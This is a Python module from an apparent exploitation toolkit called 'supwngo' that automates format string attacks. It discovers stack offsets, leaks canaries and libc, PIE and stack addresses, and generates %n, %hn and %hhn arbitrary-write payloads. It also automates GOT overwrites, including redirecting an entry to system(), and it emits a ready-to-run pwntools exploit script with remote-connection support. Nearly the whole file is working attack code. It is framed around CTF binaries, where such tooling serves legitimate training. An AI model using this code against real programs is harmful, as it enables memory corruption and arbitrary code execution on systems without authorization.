"""
Format String Exploitation Module.

Provides automated format string vulnerability exploitation including:
- Offset discovery
- Address leaking (stack, libc, canary, PIE)
- Arbitrary write primitives (%n, %hn, %hhn)
- GOT overwrite automation
- One-shot exploit generation
- Bad character handling
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Callable, Dict, List, Optional, Tuple, Any, Set
import struct

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class WriteSize(Enum):
    """Write size for format string %n variants."""
    BYTE = auto()    # %hhn - 1 byte
    SHORT = auto()   # %hn  - 2 bytes
    INT = auto()     # %n   - 4 bytes
    LONG = auto()    # %lln - 8 bytes (64-bit only)


@dataclass
class FormatStringInfo:
    """Information gathered from format string exploitation."""
    offset: int = 0  # Format string offset on stack
    leaked_addresses: List[Tuple[int, int]] = field(default_factory=list)  # (offset, value)
    canary: Optional[int] = None
    pie_base: Optional[int] = None
    libc_base: Optional[int] = None
    stack_addr: Optional[int] = None

    # Write tracking
    writes_performed: List[Tuple[int, int]] = field(default_factory=list)  # (addr, value)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "offset": self.offset,
            "canary": hex(self.canary) if self.canary else None,
            "pie_base": hex(self.pie_base) if self.pie_base else None,
            "libc_base": hex(self.libc_base) if self.libc_base else None,
            "stack_addr": hex(self.stack_addr) if self.stack_addr else None,
        }


@dataclass
class BadCharConfig:
    """Configuration for bad character handling."""
    bad_chars: Set[int] = field(default_factory=set)
    null_allowed: bool = True
    newline_allowed: bool = True
    percent_allowed: bool = True  # % can be problematic in format strings

    @classmethod
    def common_restrictions(cls) -> "BadCharConfig":
        """Create config with common bad characters."""
        return cls(
            bad_chars={0x00, 0x0a, 0x0d},  # null, newline, carriage return
            null_allowed=False,
            newline_allowed=False,
        )

    def contains_bad_char(self, data: bytes) -> bool:
        """Check if data contains bad characters."""
        for byte in data:
            if byte in self.bad_chars:
                return True
            if byte == 0x00 and not self.null_allowed:
                return True
            if byte == 0x0a and not self.newline_allowed:
                return True
        return False

    def filter_addresses(self, addresses: List[int], bits: int = 64) -> List[int]:
        """Filter addresses that contain bad characters."""
        valid = []
        size = bits // 8
        for addr in addresses:
            addr_bytes = addr.to_bytes(size, 'little')
            if not self.contains_bad_char(addr_bytes):
                valid.append(addr)
        return valid


class ArbitraryWrite:
    """
    Arbitrary write primitive via format string.

    Provides flexible write-what-where capability using format string
    vulnerabilities. Supports multiple write sizes and bad character
    avoidance.

    Usage:
        writer = ArbitraryWrite(bits=64, offset=6)
        payload = writer.write(0x601020, 0xdeadbeef)
    """

    def __init__(
        self,
        bits: int = 64,
        offset: int = 6,
        write_size: WriteSize = WriteSize.BYTE,
        bad_chars: Optional[BadCharConfig] = None,
    ):
        """
        Initialize arbitrary write primitive.

        Args:
            bits: Architecture bits (32 or 64)
            offset: Format string offset
            write_size: Default write size
            bad_chars: Bad character configuration
        """
        self.bits = bits
        self.word_size = bits // 8
        self.offset = offset
        self.write_size = write_size
        self.bad_chars = bad_chars or BadCharConfig()

    def write(
        self,
        addr: int,
        value: int,
        write_size: Optional[WriteSize] = None,
    ) -> bytes:
        """
        Generate payload to write value to address.

        Args:
            addr: Target address
            value: Value to write
            write_size: Override default write size

        Returns:
            Format string payload
        """
        ws = write_size or self.write_size

        if ws == WriteSize.BYTE:
            return self._write_bytes(addr, value)
        elif ws == WriteSize.SHORT:
            return self._write_shorts(addr, value)
        elif ws == WriteSize.INT:
            return self._write_ints(addr, value)
        elif ws == WriteSize.LONG:
            return self._write_longs(addr, value)
        else:
            return self._write_bytes(addr, value)

    def _write_bytes(self, addr: int, value: int) -> bytes:
        """Write using %hhn (byte by byte)."""
        num_bytes = 8 if self.bits == 64 else 4

        # Build addresses for each byte
        addresses = []
        values = []

        for i in range(num_bytes):
            byte_val = (value >> (i * 8)) & 0xFF
            if byte_val != 0 or i == 0:  # Always write at least first byte
                addresses.append(addr + i)
                values.append(byte_val)

        return self._build_payload(addresses, values, "%hhn")

    def _write_shorts(self, addr: int, value: int) -> bytes:
        """Write using %hn (2 bytes at a time)."""
        num_shorts = 4 if self.bits == 64 else 2

        addresses = []
        values = []

        for i in range(num_shorts):
            short_val = (value >> (i * 16)) & 0xFFFF
            if short_val != 0 or i == 0:
                addresses.append(addr + i * 2)
                values.append(short_val)

        return self._build_payload(addresses, values, "%hn")

    def _write_ints(self, addr: int, value: int) -> bytes:
        """Write using %n (4 bytes at a time)."""
        if self.bits == 64:
            addresses = [addr, addr + 4]
            values = [value & 0xFFFFFFFF, (value >> 32) & 0xFFFFFFFF]
        else:
            addresses = [addr]
            values = [value & 0xFFFFFFFF]

        return self._build_payload(addresses, values, "%n")

    def _write_longs(self, addr: int, value: int) -> bytes:
        """Write using %lln (8 bytes, 64-bit only)."""
        if self.bits != 64:
            return self._write_ints(addr, value)

        addresses = [addr]
        values = [value]

        return self._build_payload(addresses, values, "%lln")

    def _build_payload(
        self,
        addresses: List[int],
        values: List[int],
        write_fmt: str,
    ) -> bytes:
        """
        Build the format string payload.

        Strategy for 64-bit: format string + padding + addresses at end
        Strategy for 32-bit: addresses at start + format string

        Args:
            addresses: List of addresses to write to
            values: List of values to write
            write_fmt: Format specifier (%hhn, %hn, %n, %lln)

        Returns:
            Complete format string payload
        """
        # Sort writes by value for optimal padding
        writes = list(zip(addresses, values))
        writes.sort(key=lambda x: x[1])

        # Calculate base offset for addresses in payload
        # For 64-bit: addresses go at end, need to calculate offset
        # For 32-bit: addresses go at start

        if self.bits == 64:
            return self._build_64bit_payload(writes, write_fmt)
        else:
            return self._build_32bit_payload(writes, write_fmt)

    def _build_64bit_payload(
        self,
        writes: List[Tuple[int, int]],
        write_fmt: str,
    ) -> bytes:
        """Build 64-bit format string payload."""
        # Format: fmt_string + padding + addresses
        # Addresses accessed via offset+N

        fmt_parts = []
        current_written = 0
        addr_offset = self.offset

        # Build format specifiers
        for i, (addr, val) in enumerate(writes):
            # Calculate how much padding we need
            if val == 0:
                val = 256 if "%hhn" in write_fmt else (0x10000 if "%hn" in write_fmt else 0x100000000)

            diff = (val - current_written) % self._get_wrap_value(write_fmt)
            if diff == 0:
                diff = self._get_wrap_value(write_fmt)

            if diff > 0:
                fmt_parts.append(f"%{diff}c")

            fmt_parts.append(f"%{addr_offset + i}${write_fmt[1:]}")
            current_written = val

        fmt_str = "".join(fmt_parts).encode()

        # Calculate how many 8-byte slots the format string takes
        fmt_len = len(fmt_str)
        padding_needed = (8 - (fmt_len % 8)) % 8
        fmt_str += b"X" * padding_needed

        # Calculate the offset where addresses will be
        num_slots_before_addrs = len(fmt_str) // 8

        # Recalculate with correct offsets
        addr_offset = self.offset + num_slots_before_addrs

        # Rebuild with correct offsets
        fmt_parts = []
        current_written = 0

        for i, (addr, val) in enumerate(writes):
            if val == 0:
                val = 256 if "%hhn" in write_fmt else (0x10000 if "%hn" in write_fmt else 0x100000000)

            diff = (val - current_written) % self._get_wrap_value(write_fmt)
            if diff == 0:
                diff = self._get_wrap_value(write_fmt)

            if diff > 0:
                fmt_parts.append(f"%{diff}c")

            fmt_parts.append(f"%{addr_offset + i}${write_fmt[1:]}")
            current_written = val

        fmt_str = "".join(fmt_parts).encode()

        # Re-pad
        fmt_len = len(fmt_str)
        padding_needed = (8 - (fmt_len % 8)) % 8
        fmt_str += b"X" * padding_needed

        # Add addresses
        for addr, _ in writes:
            fmt_str += struct.pack("<Q", addr)

        return fmt_str

    def _build_32bit_payload(
        self,
        writes: List[Tuple[int, int]],
        write_fmt: str,
    ) -> bytes:
        """Build 32-bit format string payload."""
        # Format: addresses + fmt_string
        # Addresses at offset, offset+1, etc.

        # Pack addresses first
        addr_data = b""
        for addr, _ in writes:
            addr_data += struct.pack("<I", addr)

        # Build format string
        fmt_parts = []
        current_written = len(addr_data)  # Account for address bytes already printed

        for i, (addr, val) in enumerate(writes):
            if val == 0:
                val = 256 if "%hhn" in write_fmt else (0x10000 if "%hn" in write_fmt else 0x100000000)

            diff = (val - current_written) % self._get_wrap_value(write_fmt)
            if diff == 0:
                diff = self._get_wrap_value(write_fmt)

            if diff > 0:
                fmt_parts.append(f"%{diff}c")

            fmt_parts.append(f"%{self.offset + i}${write_fmt[1:]}")
            current_written = val

        return addr_data + "".join(fmt_parts).encode()

    def _get_wrap_value(self, write_fmt: str) -> int:
        """Get wrap value based on format specifier."""
        if "hhn" in write_fmt:
            return 256
        elif "hn" in write_fmt:
            return 0x10000
        elif "lln" in write_fmt:
            return 0x10000000000000000
        else:
            return 0x100000000


class OneShotExploit:
    """
    One-shot format string exploit generator.

    Generates a single format string payload that performs GOT overwrite
    or other writes in one printf call.

    Usage:
        exploit = OneShotExploit(bits=64, offset=6)

        # GOT overwrite to win function
        payload = exploit.got_overwrite(
            got_addr=0x601020,
            target_addr=0x400686,  # win function
        )

        # Multiple writes
        payload = exploit.multi_write({
            0x601020: 0x400686,
            0x601028: 0x400700,
        })
    """

    def __init__(
        self,
        bits: int = 64,
        offset: int = 6,
        bad_chars: Optional[BadCharConfig] = None,
    ):
        """
        Initialize one-shot exploit generator.

        Args:
            bits: Architecture bits
            offset: Format string offset
            bad_chars: Bad character configuration
        """
        self.bits = bits
        self.word_size = bits // 8
        self.offset = offset
        self.bad_chars = bad_chars or BadCharConfig()
        self.writer = ArbitraryWrite(bits, offset, WriteSize.SHORT, bad_chars)

    def got_overwrite(
        self,
        got_addr: int,
        target_addr: int,
        write_size: WriteSize = WriteSize.SHORT,
    ) -> bytes:
        """
        Generate GOT overwrite payload.

        Args:
            got_addr: Address of GOT entry to overwrite
            target_addr: Address to write (e.g., win function or one_gadget)
            write_size: Size of each write

        Returns:
            Format string payload
        """
        logger.info(f"Generating GOT overwrite: GOT@{hex(got_addr)} -> {hex(target_addr)}")

        self.writer.write_size = write_size
        return self.writer.write(got_addr, target_addr, write_size)

    def multi_write(
        self,
        writes: Dict[int, int],
        write_size: WriteSize = WriteSize.SHORT,
    ) -> bytes:
        """
        Generate payload for multiple writes.

        Args:
            writes: Dict of address -> value to write
            write_size: Size of each write

        Returns:
            Format string payload
        """
        # Combine all writes into one payload
        # Sort by target value for optimal padding

        all_addrs = []
        all_vals = []

        for addr, value in writes.items():
            # Split each value into bytes/shorts based on write_size
            if write_size == WriteSize.BYTE:
                for i in range(self.word_size):
                    byte_val = (value >> (i * 8)) & 0xFF
                    all_addrs.append(addr + i)
                    all_vals.append(byte_val)
            elif write_size == WriteSize.SHORT:
                for i in range(self.word_size // 2):
                    short_val = (value >> (i * 16)) & 0xFFFF
                    all_addrs.append(addr + i * 2)
                    all_vals.append(short_val)
            else:
                all_addrs.append(addr)
                all_vals.append(value)

        self.writer.write_size = write_size
        return self.writer._build_payload(
            all_addrs, all_vals,
            self._get_fmt_for_size(write_size)
        )

    def _get_fmt_for_size(self, write_size: WriteSize) -> str:
        """Get format specifier for write size."""
        return {
            WriteSize.BYTE: "%hhn",
            WriteSize.SHORT: "%hn",
            WriteSize.INT: "%n",
            WriteSize.LONG: "%lln",
        }.get(write_size, "%hn")

    def leak_payload(
        self,
        stack_offset: int,
        num_leaks: int = 1,
    ) -> bytes:
        """
        Generate payload to leak stack values.

        Args:
            stack_offset: Starting stack offset to leak
            num_leaks: Number of consecutive values to leak

        Returns:
            Format string payload
        """
        parts = []
        for i in range(num_leaks):
            parts.append(f"%{stack_offset + i}$p")
            if i < num_leaks - 1:
                parts.append(".")
        return "".join(parts).encode()

    def canary_leak_payload(self, canary_offset: int) -> bytes:
        """
        Generate payload to leak stack canary.

        Args:
            canary_offset: Stack offset where canary is located

        Returns:
            Format string payload with marker
        """
        return f"CANARY:%{canary_offset}$p:END".encode()

    def ret2libc_payload(
        self,
        got_addr: int,
        libc_system: int,
    ) -> bytes:
        """
        Generate payload for ret2libc via GOT overwrite.

        Overwrites a GOT entry (typically puts or printf) with system().

        Args:
            got_addr: GOT entry to overwrite
            libc_system: Address of system() in libc

        Returns:
            Format string payload
        """
        return self.got_overwrite(got_addr, libc_system, WriteSize.SHORT)


class FormatStringExploiter:
    """
    Automated format string exploitation.

    Usage:
        exploiter = FormatStringExploiter(bits=64)

        # Find offset
        offset = exploiter.find_offset(send_func, recv_func)

        # Leak addresses
        leaks = exploiter.leak_stack(send_func, recv_func, num_leaks=20)

        # Arbitrary write
        payload = exploiter.write_value(target_addr, value)
    """

    def __init__(
        self,
        bits: int = 64,
        offset: int = 0,
        write_size: str = "byte",  # byte, short, int
    ):
        """
        Initialize format string exploiter.

        Args:
            bits: Architecture bits (32 or 64)
            offset: Known format string offset (0 to auto-discover)
            write_size: Size of individual writes for %n
        """
        self.bits = bits
        self.word_size = bits // 8
        self.offset = offset
        self.write_size = write_size
        self.info = FormatStringInfo(offset=offset)

    def find_offset(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        max_offset: int = 50,
        marker: bytes = b"AAAAAAAA",
    ) -> int:
        """
        Find format string offset automatically.

        Args:
            send_func: Function to send payload to target
            recv_func: Function to receive response
            max_offset: Maximum offset to try
            marker: Unique marker to search for

        Returns:
            Discovered offset
        """
        # Use marker that's easy to spot in hex
        if self.bits == 64:
            marker = b"AAAAAAAA"
            marker_hex = "4141414141414141"
        else:
            marker = b"AAAA"
            marker_hex = "41414141"

        for i in range(1, max_offset + 1):
            # Build test payload
            payload = marker + f"%{i}$p".encode()

            try:
                send_func(payload)
                response = recv_func()
                response_str = response.decode('latin-1', errors='ignore')

                # Check if we leaked our marker
                if marker_hex.lower() in response_str.lower():
                    self.offset = i
                    self.info.offset = i
                    logger.info(f"Found format string offset: {i}")
                    return i

            except Exception as e:
                logger.debug(f"Offset {i} failed: {e}")
                continue

        logger.warning(f"Could not find offset in range 1-{max_offset}")
        return 0

    def leak_value(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        stack_offset: int,
    ) -> Optional[int]:
        """
        Leak a single value from the stack.

        Args:
            send_func: Function to send payload
            recv_func: Function to receive response
            stack_offset: Stack position to leak (relative to format string)

        Returns:
            Leaked value or None
        """
        payload = f"%{stack_offset}$p".encode()

        try:
            send_func(payload)
            response = recv_func()
            response_str = response.decode('latin-1', errors='ignore')

            # Parse hex value from response
            import re
            match = re.search(r'0x([0-9a-fA-F]+)', response_str)
            if match:
                value = int(match.group(1), 16)
                self.info.leaked_addresses.append((stack_offset, value))
                return value

        except Exception as e:
            logger.debug(f"Failed to leak offset {stack_offset}: {e}")

        return None

    def leak_stack(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        start_offset: int = 1,
        num_leaks: int = 20,
    ) -> Dict[int, int]:
        """
        Leak multiple stack values.

        Args:
            send_func: Function to send payload
            recv_func: Function to receive response
            start_offset: Starting stack offset
            num_leaks: Number of values to leak

        Returns:
            Dict mapping offset to leaked value
        """
        leaks = {}

        for i in range(start_offset, start_offset + num_leaks):
            value = self.leak_value(send_func, recv_func, i)
            if value is not None:
                leaks[i] = value
                logger.debug(f"Leak [{i}]: 0x{value:x}")

        return leaks

    def identify_leaks(
        self,
        leaks: Dict[int, int],
        binary_base: int = 0x400000,
        libc_base_hint: int = 0x7f0000000000,
        stack_hint: int = 0x7ff000000000,
    ) -> FormatStringInfo:
        """
        Identify what the leaked values might be.

        Args:
            leaks: Dict of offset -> value
            binary_base: Expected binary base (for PIE detection)
            libc_base_hint: Expected libc range start
            stack_hint: Expected stack range start

        Returns:
            Updated FormatStringInfo
        """
        for offset, value in leaks.items():
            # Canary detection (usually ends in 00)
            if value & 0xFF == 0 and value > 0x100:
                if self.info.canary is None:
                    self.info.canary = value
                    logger.info(f"Potential canary at offset {offset}: 0x{value:x}")

            # Stack address detection
            if self.bits == 64 and (value >> 40) == 0x7ff:
                if self.info.stack_addr is None:
                    self.info.stack_addr = value
                    logger.info(f"Potential stack addr at offset {offset}: 0x{value:x}")

            # Libc address detection
            if self.bits == 64 and (value >> 40) == 0x7f:
                if value != self.info.stack_addr:
                    if self.info.libc_base is None:
                        # Rough base calculation (page-align)
                        self.info.libc_base = value & ~0xfff
                        logger.info(f"Potential libc addr at offset {offset}: 0x{value:x}")

            # PIE base detection
            if 0x500000 <= value <= 0x600000 or (value >> 44) == 0x5:
                if self.info.pie_base is None:
                    self.info.pie_base = value & ~0xfff
                    logger.info(f"Potential PIE base at offset {offset}: 0x{value:x}")

        return self.info

    def write_byte(self, addr: int, value: int) -> bytes:
        """
        Generate payload to write a single byte.

        Args:
            addr: Target address
            value: Byte value to write

        Returns:
            Format string payload
        """
        if self.bits == 64:
            addr_bytes = struct.pack("<Q", addr)
        else:
            addr_bytes = struct.pack("<I", addr)

        # Calculate padding needed
        if value == 0:
            value = 256  # %256c then %hhn writes 0

        # Payload: %Xc%offset$hhn + address
        # Note: address at offset needs to be calculated
        offset = self.offset
        payload = f"%{value}c%{offset}$hhn".encode()

        # Pad to alignment
        while len(payload) % self.word_size != 0:
            payload += b"X"

        payload += addr_bytes

        return payload

    def write_value(
        self,
        addr: int,
        value: int,
        write_size: str = None,
    ) -> bytes:
        """
        Generate payload to write an arbitrary value.

        Uses %hhn (byte) or %hn (short) writes for reliability.

        Args:
            addr: Target address
            value: Value to write
            write_size: Override default write size

        Returns:
            Format string payload
        """
        write_size = write_size or self.write_size

        if write_size == "byte":
            return self._write_bytes(addr, value)
        elif write_size == "short":
            return self._write_shorts(addr, value)
        else:
            return self._write_ints(addr, value)

    def _write_bytes(self, addr: int, value: int) -> bytes:
        """Write value byte-by-byte using %hhn."""
        num_bytes = self.word_size
        value_bytes = value.to_bytes(num_bytes, 'little')

        # Build addresses
        addresses = b""
        for i in range(num_bytes):
            if self.bits == 64:
                addresses += struct.pack("<Q", addr + i)
            else:
                addresses += struct.pack("<I", addr + i)

        # Calculate format string
        writes = []
        current = 0
        base_offset = self.offset

        for i, byte_val in enumerate(value_bytes):
            target = byte_val
            if target == 0:
                target = 256

            diff = (target - current) % 256
            if diff == 0:
                diff = 256

            writes.append(f"%{diff}c%{base_offset + i}$hhn")
            current = target

        fmt_str = "".join(writes).encode()

        # Pad to alignment
        while len(fmt_str) % self.word_size != 0:
            fmt_str += b"X"

        return fmt_str + addresses

    def _write_shorts(self, addr: int, value: int) -> bytes:
        """Write value using %hn (2 bytes at a time)."""
        num_shorts = self.word_size // 2

        addresses = b""
        for i in range(num_shorts):
            if self.bits == 64:
                addresses += struct.pack("<Q", addr + i * 2)
            else:
                addresses += struct.pack("<I", addr + i * 2)

        writes = []
        current = 0
        base_offset = self.offset

        for i in range(num_shorts):
            short_val = (value >> (i * 16)) & 0xFFFF
            if short_val == 0:
                short_val = 0x10000

            diff = (short_val - current) % 0x10000
            if diff == 0:
                diff = 0x10000

            writes.append(f"%{diff}c%{base_offset + i}$hn")
            current = short_val

        fmt_str = "".join(writes).encode()

        while len(fmt_str) % self.word_size != 0:
            fmt_str += b"X"

        return fmt_str + addresses

    def _write_ints(self, addr: int, value: int) -> bytes:
        """Write value using %n (4 bytes at a time)."""
        if self.bits == 64:
            addresses = struct.pack("<QQ", addr, addr + 4)
            writes = []

            low = value & 0xFFFFFFFF
            high = (value >> 32) & 0xFFFFFFFF

            if low > 0:
                writes.append(f"%{low}c%{self.offset}$n")
            if high > 0:
                diff = (high - low) % (1 << 32)
                writes.append(f"%{diff}c%{self.offset + 1}$n")
        else:
            addresses = struct.pack("<I", addr)
            writes = [f"%{value}c%{self.offset}$n"]

        fmt_str = "".join(writes).encode()

        while len(fmt_str) % self.word_size != 0:
            fmt_str += b"X"

        return fmt_str + addresses

    def got_overwrite(
        self,
        got_addr: int,
        target_addr: int,
    ) -> bytes:
        """
        Generate payload to overwrite a GOT entry.

        Args:
            got_addr: Address of GOT entry to overwrite
            target_addr: Address to write (e.g., system or one_gadget)

        Returns:
            Format string payload
        """
        logger.info(f"Generating GOT overwrite: 0x{got_addr:x} -> 0x{target_addr:x}")
        return self.write_value(got_addr, target_addr)

    @staticmethod
    def pwntools_payload(
        offset: int,
        writes: Dict[int, int],
        bits: int = 64,
    ) -> bytes:
        """
        Generate format string payload using pwntools fmtstr_payload.

        Args:
            offset: Format string offset
            writes: Dict of address -> value to write
            bits: Architecture bits

        Returns:
            Format string payload
        """
        try:
            from pwn import fmtstr_payload, context

            if bits == 64:
                context.arch = 'amd64'
            else:
                context.arch = 'i386'

            return fmtstr_payload(offset, writes)
        except ImportError:
            logger.warning("pwntools not available, using manual payload generation")
            # Fallback to manual
            exploiter = FormatStringExploiter(bits=bits, offset=offset)
            payloads = []
            for addr, val in writes.items():
                payloads.append(exploiter.write_value(addr, val))
            return b"".join(payloads)


# Convenience functions
def find_fmt_offset(
    send_func: Callable[[bytes], None],
    recv_func: Callable[[], bytes],
    bits: int = 64,
    max_offset: int = 50,
) -> int:
    """Find format string offset."""
    exploiter = FormatStringExploiter(bits=bits)
    return exploiter.find_offset(send_func, recv_func, max_offset)


def fmt_leak(
    send_func: Callable[[bytes], None],
    recv_func: Callable[[], bytes],
    offset: int,
    bits: int = 64,
    num_leaks: int = 20,
) -> Dict[int, int]:
    """Leak stack values via format string."""
    exploiter = FormatStringExploiter(bits=bits, offset=offset)
    return exploiter.leak_stack(send_func, recv_func, num_leaks=num_leaks)


def fmt_write(
    addr: int,
    value: int,
    offset: int,
    bits: int = 64,
) -> bytes:
    """Generate format string write payload."""
    exploiter = FormatStringExploiter(bits=bits, offset=offset)
    return exploiter.write_value(addr, value)


def fmt_got_overwrite(
    got_addr: int,
    target_addr: int,
    offset: int,
    bits: int = 64,
    write_size: WriteSize = WriteSize.SHORT,
) -> bytes:
    """
    Generate GOT overwrite payload.

    Args:
        got_addr: GOT entry to overwrite
        target_addr: Target address (win function, one_gadget, etc.)
        offset: Format string offset
        bits: Architecture bits
        write_size: Size of writes

    Returns:
        Format string payload
    """
    exploit = OneShotExploit(bits=bits, offset=offset)
    return exploit.got_overwrite(got_addr, target_addr, write_size)


def fmt_multi_write(
    writes: Dict[int, int],
    offset: int,
    bits: int = 64,
    write_size: WriteSize = WriteSize.SHORT,
) -> bytes:
    """
    Generate payload for multiple writes.

    Args:
        writes: Dict of address -> value
        offset: Format string offset
        bits: Architecture bits
        write_size: Size of writes

    Returns:
        Format string payload
    """
    exploit = OneShotExploit(bits=bits, offset=offset)
    return exploit.multi_write(writes, write_size)


class FormatStringAutoExploit:
    """
    Automated format string exploitation for CTF-style binaries.

    Combines offset discovery, leak identification, and exploitation
    into a streamlined workflow.

    Usage:
        auto = FormatStringAutoExploit(binary)

        # Full auto exploit
        success, payload = auto.exploit(
            send_func, recv_func,
            win_addr=0x400686
        )

        # Or step by step
        auto.find_offset(send_func, recv_func)
        auto.leak_and_identify(send_func, recv_func)
        payload = auto.generate_exploit(got_addr, win_addr)
    """

    def __init__(
        self,
        binary: Optional[Any] = None,
        bits: int = 64,
        bad_chars: Optional[BadCharConfig] = None,
    ):
        """
        Initialize auto exploit.

        Args:
            binary: Target binary (for GOT/PLT resolution)
            bits: Architecture bits
            bad_chars: Bad character restrictions
        """
        self.binary = binary
        self.bits = bits
        self.bad_chars = bad_chars or BadCharConfig()
        self.info = FormatStringInfo()
        self.exploiter = FormatStringExploiter(bits=bits)
        self.one_shot = None  # Initialized after offset found

    def find_offset(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        max_offset: int = 50,
    ) -> int:
        """
        Find format string offset.

        Args:
            send_func: Send function
            recv_func: Receive function
            max_offset: Maximum offset to try

        Returns:
            Discovered offset
        """
        offset = self.exploiter.find_offset(send_func, recv_func, max_offset)
        if offset > 0:
            self.info.offset = offset
            self.one_shot = OneShotExploit(
                bits=self.bits,
                offset=offset,
                bad_chars=self.bad_chars
            )
        return offset

    def leak_and_identify(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        num_leaks: int = 30,
    ) -> FormatStringInfo:
        """
        Leak stack values and identify interesting addresses.

        Args:
            send_func: Send function
            recv_func: Receive function
            num_leaks: Number of stack positions to leak

        Returns:
            Updated FormatStringInfo
        """
        leaks = self.exploiter.leak_stack(
            send_func, recv_func,
            start_offset=1,
            num_leaks=num_leaks
        )
        self.info = self.exploiter.identify_leaks(leaks)
        return self.info

    def generate_exploit(
        self,
        got_addr: int,
        target_addr: int,
        write_size: WriteSize = WriteSize.SHORT,
    ) -> bytes:
        """
        Generate exploit payload.

        Args:
            got_addr: GOT entry to overwrite
            target_addr: Target address
            write_size: Write size to use

        Returns:
            Exploit payload
        """
        if self.one_shot is None:
            raise ValueError("Must find offset first")

        return self.one_shot.got_overwrite(got_addr, target_addr, write_size)

    def exploit(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        win_addr: Optional[int] = None,
        got_target: str = "exit",
    ) -> Tuple[bool, bytes]:
        """
        Attempt full automated exploitation.

        Args:
            send_func: Send function
            recv_func: Receive function
            win_addr: Win function address (or will try to find)
            got_target: GOT entry to overwrite

        Returns:
            (success, payload) tuple
        """
        # Find offset
        offset = self.find_offset(send_func, recv_func)
        if offset == 0:
            logger.error("Could not find format string offset")
            return False, b""

        # Get GOT address
        got_addr = None
        if self.binary:
            got_addr = self.binary.got.get(got_target)

        if not got_addr:
            logger.error(f"Could not find GOT entry for {got_target}")
            return False, b""

        # Get win address
        if win_addr is None and self.binary:
            # Try to find win function
            win_names = ["win", "flag", "shell", "get_flag", "backdoor"]
            for name in win_names:
                if name in self.binary.symbols:
                    sym = self.binary.symbols[name]
                    win_addr = sym.address if hasattr(sym, 'address') else sym
                    logger.info(f"Found win function: {name} @ {hex(win_addr)}")
                    break

        if win_addr is None:
            logger.error("Could not find win function address")
            return False, b""

        # Generate payload
        payload = self.generate_exploit(got_addr, win_addr)
        logger.info(f"Generated exploit: GOT@{hex(got_addr)} -> {hex(win_addr)}")

        return True, payload

    def generate_script(
        self,
        got_addr: int,
        target_addr: int,
    ) -> str:
        """
        Generate a Python exploit script.

        Args:
            got_addr: GOT address to overwrite
            target_addr: Target address

        Returns:
            Python script as string
        """
        binary_name = self.binary.path.name if self.binary else "vuln"

        return f'''#!/usr/bin/env python3
"""
Format String Exploit for {binary_name}
Generated by supwngo

Offset: {self.info.offset}
GOT target: {hex(got_addr)}
Target addr: {hex(target_addr)}
"""

from pwn import *

BINARY = "{binary_name}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Format string offset
    offset = {self.info.offset}

    # Target addresses
    got_addr = {hex(got_addr)}
    target_addr = {hex(target_addr)}

    # Generate payload using pwntools
    payload = fmtstr_payload(offset, {{got_addr: target_addr}})

    log.info(f"Payload length: {{len(payload)}}")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''
